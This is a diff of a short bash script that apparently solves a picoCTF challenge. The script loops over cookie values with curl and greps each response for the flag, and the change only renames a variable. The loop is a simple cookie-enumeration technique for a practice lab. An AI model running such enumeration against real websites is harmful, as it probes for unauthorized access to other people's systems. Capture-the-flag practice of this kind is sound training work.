@@ -15,13 +15,13 @@ while true; do
 	CONTENT=$( curl -s -b "name=$I" $URL )
 
 	# search for flag in the content
-	VALUE=$( echo $CONTENT | grep -o "picoCTF{[^ ]*}" )
+	FLAG=$( echo $CONTENT | grep -o "picoCTF{[^ ]*}" )
 
 	echo "curl -s -b \"name=$I\" $URL"; # just printing the command
 
-	#check if the value not empty
-	if [ "$VALUE" != "" ]; then 
-		echo -e "YOUR FALG IS : \033[32m$VALUE\033[m" # print the flag
+	#check if the flag not empty
+	if [ "$FLAG" != "" ]; then 
+		echo -e "YOUR FALG IS : \033[32m$FLAG\033[m" # print the flag
 		break;
 	fi
 
